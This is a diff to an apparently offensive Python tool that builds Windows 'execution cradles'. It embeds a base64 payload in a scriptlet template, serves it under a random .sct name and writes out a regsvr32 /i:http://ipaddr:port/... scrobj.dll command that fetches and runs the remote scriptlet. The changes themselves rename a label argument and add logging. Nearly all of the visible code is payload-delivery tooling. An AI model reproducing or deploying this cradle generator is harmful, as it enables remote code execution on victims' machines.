@@ -40,9 +40,11 @@ cradle_dictionary = {}
 def randomString(length=6):
 	return ''.join(random.choice(string.ascii_lowercase) for i in range(length))
 
-def add_cradle_call_command(cradle_name,execution_cradle_command):
+def add_cradle_call_command(cradle_method,execution_cradle_command): # cradle_method is the name of the method used for the execution, its only used in the 'cradle_commands.txt' file as a label.
+	# execution is the full command copied into the windows prompt
+	open(cradle_commands_file, 'w').close()
 	with open(cradle_commands_file,'a') as filecontents:
-		filecontents.write('%s:\n' % cradle_name)
+		filecontents.write('%s:\n' % cradle_method)
 		filecontents.write(execution_cradle_command+'\n')
 		filecontents.write('\n')
 
@@ -78,10 +80,10 @@ def set_cradle(filename, filecontents):
 	destination_file.write(filecontents)
 	destination_file.close()
 
-def register_cradle(filename,random_sct_filename, shellcontent,execution_cradle_command):
+def register_cradle(cradle_method,filename,random_sct_filename, shellcontent,execution_cradle_command):
 	cradle_dictionary[filename,] = [random_sct_filename,execution_cradle_command]
 	set_cradle(random_sct_filename, shellcontent)
-	add_cradle_call_command(random_sct_filename,execution_cradle_command)
+	add_cradle_call_command(cradle_method,execution_cradle_command)
 
 # Get a resource
 def get_resource(filename):
@@ -158,7 +160,7 @@ def regsvr32():
 	regsvr_cradle_scriptlet = get_cradle(regsvr32_template_file,b64_payload) # takes in the template cradle and the b64 payload
 	random_sct_filename = '%s.sct' % randomString(12)
 	execution_cradle_command = 'regsvr32 /s /n /u /i:http://%s:%s/%s scrobj.dll' % (ipaddr,port,random_sct_filename)
-	register_cradle(shell_name,random_sct_filename, regsvr_cradle_scriptlet,execution_cradle_command) # filename, shellcontent,execution_cradle. 
+	register_cradle('regsvr32',shell_name,random_sct_filename, regsvr_cradle_scriptlet,execution_cradle_command) # filename, shellcontent,execution_cradle. 
 
 def cradles():
 	regsvr32()
@@ -181,3 +183,5 @@ cradles()
 logger.heading('Cradles')
 
 print_cradle_dictionary()
+
+print('All execution cradles can be found in %s!' % logger.green_fg(cradle_commands_file))
